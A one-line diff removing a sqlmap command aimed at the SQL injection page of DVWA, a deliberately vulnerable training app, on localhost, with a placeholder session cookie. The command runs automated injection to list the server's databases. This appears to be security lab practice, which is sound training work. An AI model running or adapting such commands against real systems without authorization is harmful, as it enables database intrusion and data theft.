@@ -1,1 +1,0 @@
-http://localhost:8081/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# (GET)  # /usr/bin/sqlmap -u http://localhost:8081/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# "--cookie=security=low; PHPSESSID=SUBSTITUA_AQUI" --batch --dbs -o --output-dir=../resultados
